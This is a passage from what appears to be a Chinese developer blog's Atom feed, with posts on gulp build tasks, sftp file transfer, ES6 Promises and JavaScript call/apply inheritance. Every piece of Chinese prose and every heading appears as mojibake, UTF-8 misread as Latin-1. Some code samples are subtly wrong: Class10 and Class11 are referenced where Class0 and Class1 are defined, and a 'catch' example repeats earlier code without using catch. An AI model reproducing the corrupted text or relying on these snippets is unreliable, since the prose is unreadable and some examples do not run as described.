class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">gulp.task(<span class="string">'webpack'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"> callback </span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> webpack(webpackConfig, <span class="function"><span class="keyword">function</span>(<span class="params"> err, stats </span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(err) <span class="keyword">throw</span> <span class="keyword">new</span> gutil.PluginError(<span class="string">'webpack'</span>, err);</div><div class="line">    gutil.log(<span class="string">'[webpack]'</span>, stats.toString(&#123;&#125;));</div><div class="line">    callback();</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="gulp-uglify"><a href="#gulp-uglify" class="headerlink" title="gulp-uglify"></a>gulp-uglify</h5><p>è¿™é‡Œæ˜¯å‹ç¼©åŠŸèƒ½ï¼ŒåŒ…æ‹¬ç”¨ <code>gulp-rename</code> ä¿®æ”¹ç”Ÿæˆæ–‡ä»¶çš„åç¼€ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">gulp.task(<span class="string">'compress'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'public/build/bundle.js'</span>)</div><div class="line">    .pipe(uglify())</div><div class="line">    .pipe(rename(&#123;</div><div class="line">        extname:<span class="string">'.min.js'</span></div><div class="line">    &#125;))</div><div class="line">    .pipe(gulp.dest(<span class="string">'public/build'</span>));</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h4 id="default"><a href="#default" class="headerlink" title="default"></a>default</h4><p>å¦‚æœæ²¡æœ‰å†™å¥½ <code>gulp.task(&#39;default&#39;)</code> å°±è¦æŒ‡å®š <code>gulp</code> è¿è¡Œçš„å‚æ•°ï¼Œæ¯”å¦‚ <code>gulp compress</code>ï¼Œå†™å¥½åªè¦ <code>gulp</code> å³å¯ç»Ÿä¸€æ‰§è¡Œï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gulp.task(<span class="string">'default'</span>, [<span class="string">'less'</span>, <span class="string">'coffee'</span>, <span class="string">'webpack'</span>, <span class="string">'compress'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    gulp.watch(<span class="string">'public/src/*.less'</span>, [<span class="string">'less'</span>]);</div><div class="line">    gulp.watch(<span class="string">'public/src/*.coffee'</span>, [<span class="string">'coffee'</span>]);</div><div class="line">    gulp.watch(<span class="string">'public/src/*.js'</span>, [<span class="string">'webpack'</span>]);</div><div class="line">    gulp.watch(<span class="string">'public/build/bundle.js'</span>, [<span class="string">'compress'</span>]);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;æƒ³äº†è§£ &lt;strong&gt;gulpjs&lt;/strong&gt; æ˜¯ä»€ä¹ˆå¯ä»¥çœ‹&lt;a href=&quot;http://gulpjs.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;å®˜ç½‘&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;å¼•å…¥&quot;&gt;&lt;a href=&quot;#å¼•å…¥&quot; class=&quot;headerlink&quot; title=&quot;å¼•å…¥&quot;&gt;&lt;/a&gt;å¼•å…¥&lt;/h4&gt;&lt;p&gt;æˆ‘å·²ç»å†™å¥½ä¸€ä¸ªé¡¹ç›®çš„ &lt;code&gt;gulpfile.js&lt;/code&gt;ï¼Œå…¶ä¸­ç”¨åˆ°çš„ &lt;strong&gt;gulpjs&lt;/strong&gt; æ’ä»¶åŒ…æ‹¬ &lt;code&gt;gulp-less&lt;/code&gt;ã€&lt;code&gt;gulp-coffee&lt;/code&gt;ã€&lt;code&gt;gulp-util&lt;/code&gt;ã€&lt;code&gt;webpack&lt;/code&gt;ã€&lt;code&gt;gulp-uglify&lt;/code&gt;ã€&lt;code&gt;gulp-rename&lt;/code&gt;ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="NodeJS" scheme="http://youngdze.co/categories/NodeJS/"/>
    
    
      <category term="gulpjs" scheme="http://youngdze.co/tags/gulpjs/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨ sftp ä¸æœåŠ¡å™¨è¿›è¡Œæ–‡ä»¶ä¼ è¾“</title>
    <link href="http://youngdze.co/2015/09/14/use-sftp-transfer-files-with-remote-server/"/>
    <id>http://youngdze.co/2015/09/14/use-sftp-transfer-files-with-remote-server/</id>
    <published>2015-09-14T02:01:04.000Z</published>
    <updated>2016-12-05T05:37:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <strong>sftp</strong> ä¸æœåŠ¡å™¨è¿›è¡Œæ–‡ä»¶ä¼ è¾“æ¯” <strong>ftp</strong> è¦å®‰å…¨ã€‚</p><h4 id="ç™»é™†"><a href="#ç™»é™†" class="headerlink" title="ç™»é™†"></a>ç™»é™†</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sftp username@remote_hostname_or_IP</div></pre></td></tr></table></figure><a id="more"></a><h4 id="æœåŠ¡å™¨æ“ä½œ"><a href="#æœåŠ¡å™¨æ“ä½œ" class="headerlink" title="æœåŠ¡å™¨æ“ä½œ"></a>æœåŠ¡å™¨æ“ä½œ</h4><p><strong>sftp</strong> åœ¨æœåŠ¡å™¨çš„æ“ä½œå’Œ <strong>ssh</strong> åœ¨æœåŠ¡å™¨çš„æ“ä½œæ˜¯ä¸€æ ·çš„ï¼Œéƒ½å¯ä»¥ç”¨ <code>ls</code>, <code>pwd</code>, <code>cd</code> ç­‰å‘½ä»¤ã€‚</p><h4 id="æœ¬åœ°æ“ä½œ"><a href="#æœ¬åœ°æ“ä½œ" class="headerlink" title="æœ¬åœ°æ“ä½œ"></a>æœ¬åœ°æ“ä½œ</h4><p><strong>sftp</strong> æ“ä½œæœ¬åœ°å¯ä»¥åœ¨å‘½ä»¤å‰åŠ ä¸ª <code>l</code> è¡¨ç¤º <em>local</em>ï¼Œæ¯”å¦‚ <code>ls</code> å°±è¦ <code>lls</code>ï¼Œ<code>mkdir</code> ç”¨ <code>lmkdir</code>ã€‚ ä¹Ÿå¯ä»¥è¾“å…¥ <code>!</code> è¿›å…¥æœ¬åœ° <em>shell</em> æ“ä½œï¼Œä½¿ç”¨ <code>exit</code> é€€å‡ºã€‚</p><h4 id="ä¸Šä¼ "><a href="#ä¸Šä¼ " class="headerlink" title="ä¸Šä¼ "></a>ä¸Šä¼ </h4><p>ä¸Šä¼ å‘½ä»¤ä¸ºï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">put localFile</div></pre></td></tr></table></figure><h4 id="ä¸Šä¼ æ–‡ä»¶å¤¹"><a href="#ä¸Šä¼ æ–‡ä»¶å¤¹" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶å¤¹"></a>ä¸Šä¼ æ–‡ä»¶å¤¹</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">put -r localDir</div></pre></td></tr></table></figure><h4 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h4><p>ä¸‹è½½å‘½ä»¤ä¸ºï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">get remoteFile</div></pre></td></tr></table></figure><h4 id="é‡å‘½å"><a href="#é‡å‘½å" class="headerlink" title="é‡å‘½å"></a>é‡å‘½å</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">get remoteFile localName</div></pre></td></tr></table></figure><h4 id="ä¸‹è½½æ–‡ä»¶å¤¹å¹¶ä¿ç•™æƒé™"><a href="#ä¸‹è½½æ–‡ä»¶å¤¹å¹¶ä¿ç•™æƒé™" class="headerlink" title="ä¸‹è½½æ–‡ä»¶å¤¹å¹¶ä¿ç•™æƒé™"></a>ä¸‹è½½æ–‡ä»¶å¤¹å¹¶ä¿ç•™æƒé™</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">get -Pr remoteFile</div></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><ul><li><a href="https://www.digitalocean.com/community/tutorials/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server" target="_blank" rel="external">How To Use SFTP to Securely Transfer Files with a Remote Server</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä½¿ç”¨ &lt;strong&gt;sftp&lt;/strong&gt; ä¸æœåŠ¡å™¨è¿›è¡Œæ–‡ä»¶ä¼ è¾“æ¯” &lt;strong&gt;ftp&lt;/strong&gt; è¦å®‰å…¨ã€‚&lt;/p&gt;
&lt;h4 id=&quot;ç™»é™†&quot;&gt;&lt;a href=&quot;#ç™»é™†&quot; class=&quot;headerlink&quot; title=&quot;ç™»é™†&quot;&gt;&lt;/a&gt;ç™»é™†&lt;/h4&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sftp username@remote_hostname_or_IP&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://youngdze.co/categories/Linux/"/>
    
    
      <category term="sftp" scheme="http://youngdze.co/tags/sftp/"/>
    
  </entry>
  
  <entry>
    <title>ECMAScript6 Promise</title>
    <link href="http://youngdze.co/2015/09/08/ecmascript6-promise/"/>
    <id>http://youngdze.co/2015/09/08/ecmascript6-promise/</id>
    <published>2015-09-08T03:07:25.000Z</published>
    <updated>2016-12-05T11:43:55.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Promise-è§£é‡Š"><a href="#Promise-è§£é‡Š" class="headerlink" title="Promise è§£é‡Š"></a><em>Promise</em> è§£é‡Š</h4><blockquote><p>The Promise object is used for deferred and asynchronous computations.</p></blockquote><a id="more"></a><h4 id="Promise-è¯­æ³•"><a href="#Promise-è¯­æ³•" class="headerlink" title="Promise è¯­æ³•"></a><em>Promise</em> è¯­æ³•</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(executor);</div><div class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123; ... &#125;);</div></pre></td></tr></table></figure><h4 id="Promise-ç»“æ„"><a href="#Promise-ç»“æ„" class="headerlink" title="Promise ç»“æ„"></a><em>Promise</em> ç»“æ„</h4><h5 id="Constructor"><a href="#Constructor" class="headerlink" title="Constructor"></a>Constructor</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;&#125;);</div></pre></td></tr></table></figure><p><strong>resolve(thenable)</strong></p><p>Your promise will be fulfilled/rejected with the outcome of thenable</p><p><strong>resolve(obj)</strong></p><p>Your promise is fulfilled with obj</p><p><strong>reject(obj)</strong></p><p>Your promise is rejected with obj. For consistency and debugging (eg stack traces), obj should be an instanceof Error. Any errors thrown in the constructor callback will be implicitly passed to reject(). Instance Methods</p><p><strong>promise.then(onFulfilled, onRejected)</strong></p><p>onFulfilled is called when/if â€œpromiseâ€ resolves. onRejected is called when/if â€œpromiseâ€ rejects. Both are optional, if either/both are omitted the next onFulfilled/onRejected in the chain is called. Both callbacks have a single parameter, the fulfillment value or rejection reason. â€œthenâ€ returns a new promise equivalent to the value you return from onFulfilled/onRejected after being passed through Promise.resolve. If an error is thrown in the callback, the returned promise rejects with that error.</p><p><strong>promise.catch(onRejected)</strong></p><p>Sugar for promise.then(undefined, onRejected)</p><h5 id="ç®€å•ä¾‹å­"><a href="#ç®€å•ä¾‹å­" class="headerlink" title="ç®€å•ä¾‹å­"></a>ç®€å•ä¾‹å­</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</div><div class="line">    resolve(<span class="string">'Stuff worked!'</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    reject(<span class="string">'It broke'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">p.then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(result);</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(err);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="æ¥å—å‚æ•°çš„ä¾‹å­"><a href="#æ¥å—å‚æ•°çš„ä¾‹å­" class="headerlink" title="æ¥å—å‚æ•°çš„ä¾‹å­"></a>æ¥å—å‚æ•°çš„ä¾‹å­</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    fs.readFile(url, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (err) reject(err);</div><div class="line">        resolve(data);</div><div class="line">    &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">get(<span class="string">'es.js'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(response);</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.error(error);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="è¿˜å¯ä»¥ç”¨-Promise-catch-æ•è·é”™è¯¯"><a href="#è¿˜å¯ä»¥ç”¨-Promise-catch-æ•è·é”™è¯¯" class="headerlink" title="è¿˜å¯ä»¥ç”¨ Promise.catch() æ•è·é”™è¯¯"></a>è¿˜å¯ä»¥ç”¨ <code>Promise.catch()</code> æ•è·é”™è¯¯</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    fs.readFile(url, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (err) reject(err);</div><div class="line">        resolve(data);</div><div class="line">    &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">get(<span class="string">'es.js'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(response);</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.error(error);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="é“¾å¼è¯·æ±‚"><a href="#é“¾å¼è¯·æ±‚" class="headerlink" title="é“¾å¼è¯·æ±‚"></a>é“¾å¼è¯·æ±‚</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">get(<span class="string">'es.js'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(response);</div><div class="line">&#125;).then(<span class="literal">undefined</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.error(err);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="å¼‚æ­¥è¯·æ±‚ä¾‹å­"><a href="#å¼‚æ­¥è¯·æ±‚ä¾‹å­" class="headerlink" title="å¼‚æ­¥è¯·æ±‚ä¾‹å­"></a>å¼‚æ­¥è¯·æ±‚ä¾‹å­</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">    <span class="comment">// Return a new promise.</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    <span class="comment">// Do the usual XHR stuff</span></div><div class="line">    <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">    req.open(<span class="string">'GET'</span>, url);</div><div class="line"></div><div class="line">    req.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="comment">// This is called even on 404 etc</span></div><div class="line">        <span class="comment">// so check the status</span></div><div class="line">        <span class="keyword">if</span> (req.status == <span class="number">200</span>) &#123;</div><div class="line">        <span class="comment">// Resolve the promise with the response text</span></div><div class="line">        resolve(req.response);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">// Otherwise reject with the status text</span></div><div class="line">        <span class="comment">// which will hopefully be a meaningful error</span></div><div class="line">        reject(<span class="built_in">Error</span>(req.statusText));</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="comment">// Handle network errors</span></div><div class="line">    req.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        reject(<span class="built_in">Error</span>(<span class="string">"Network Error"</span>));</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="comment">// Make the request</span></div><div class="line">    req.send();</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">get(<span class="string">'story.json'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">"Success!"</span>, response);</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.error(<span class="string">"Failed!"</span>, error);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h4 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h4><p><em>Q</em> æŒ‡çš„æ˜¯ <a href="https://github.com/kriskowal/q" target="_blank" rel="external">kriskowal/q</a>ï¼Œä¸€ä¸ªæä¾› <strong>Promise</strong> ç‰¹æ€§çš„ç»„ä»¶ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> Q = <span class="built_in">require</span>(<span class="string">'q'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> d = Q.defer();</div><div class="line">    fs.readFile(url, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (err) d.reject(err);</div><div class="line">    d.resolve(data);</div><div class="line">    &#125;);</div><div class="line">    <span class="keyword">return</span> d.promise;</div><div class="line">&#125;</div><div class="line"></div><div class="line">get(<span class="string">'es6.js'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> data.length;</div><div class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(data);</div><div class="line">&#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(err);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;Promise-è§£é‡Š&quot;&gt;&lt;a href=&quot;#Promise-è§£é‡Š&quot; class=&quot;headerlink&quot; title=&quot;Promise è§£é‡Š&quot;&gt;&lt;/a&gt;&lt;em&gt;Promise&lt;/em&gt; è§£é‡Š&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;The Promise object is used for deferred and asynchronous computations.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="Promise" scheme="http://youngdze.co/tags/Promise/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript ç»§æ‰¿</title>
    <link href="http://youngdze.co/2015/09/07/javascript-inheritance/"/>
    <id>http://youngdze.co/2015/09/07/javascript-inheritance/</id>
    <published>2015-09-07T15:53:09.000Z</published>
    <updated>2017-02-06T11:21:46.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="call-amp-apply"><a href="#call-amp-apply" class="headerlink" title="call &amp; apply"></a>call &amp; apply</h3><p><code>call</code> å’Œ <code>apply</code> ä½œç”¨åŸºæœ¬ç›¸åŒï¼Œéƒ½å¯ä»¥è®©ä¸€ä¸ªå¯¹è±¡å¼•ç”¨å¦ä¸€ä¸ªå¯¹è±¡æˆ–å®ƒçš„æ–¹æ³•ï¼Œä¸¤è€…å”¯ä¸€çš„<a href="http://stackoverflow.com/questions/1986896/what-is-the-difference-between-call-and-apply" target="_blank" rel="external">ä¸åŒ</a>æ˜¯ <code>call</code> æ¥å—å‡½æ•°å‚æ•°çš„æ–¹å¼æ˜¯ä¸€ä¸ªä¸ªåˆ—å‡ºæ¥ï¼Œ<code>apply</code> æ¥å—å‡½æ•°å‚æ•°çš„æ–¹å¼æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ <a id="more"></a></p><p><code>call</code> çš„<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/call" target="_blank" rel="external">å®šä¹‰</a>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fun.call(thisArg[, arg1[, arg2[, ...]]])</div></pre></td></tr></table></figure><p><code>apply</code> çš„<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/apply" target="_blank" rel="external">å®šä¹‰</a>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fun.apply(thisArg, [argsArray])</div></pre></td></tr></table></figure><h4 id="call-çš„ç»§æ‰¿"><a href="#call-çš„ç»§æ‰¿" class="headerlink" title="call çš„ç»§æ‰¿"></a><code>call</code> çš„ç»§æ‰¿</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params">name</span>)</span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">    <span class="keyword">this</span>.showName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        alert(<span class="keyword">this</span>.name);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name</span>)</span>&#123;</div><div class="line">    Animal.call(<span class="keyword">this</span>, name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> Cat(<span class="string">"Black Cat"</span>);</div><div class="line">cat.showName();</div></pre></td></tr></table></figure><h4 id="apply-çš„ç»§æ‰¿"><a href="#apply-çš„ç»§æ‰¿" class="headerlink" title="apply çš„ç»§æ‰¿"></a><code>apply</code> çš„ç»§æ‰¿</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Class0</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.showSub = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>) </span>&#123;</div><div class="line">        alert(a-b);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Class1</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.showAdd = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>) </span>&#123;</div><div class="line">        alert(a+b);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Class2</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    Class10.apply(<span class="keyword">this</span>);</div><div class="line">    Class11.apply(<span class="keyword">this</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><code>call</code> å’Œ <code>apply</code> çš„ç»§æ‰¿æ–¹æ³•éƒ½ä¸èƒ½ç»§æ‰¿åŸå‹é“¾ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params">name</span>)</span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">    <span class="keyword">this</span>.showName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        alert(<span class="keyword">this</span>.name);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Animal.prototype.say = <span class="function"><span class="keyword">function</span>(<span 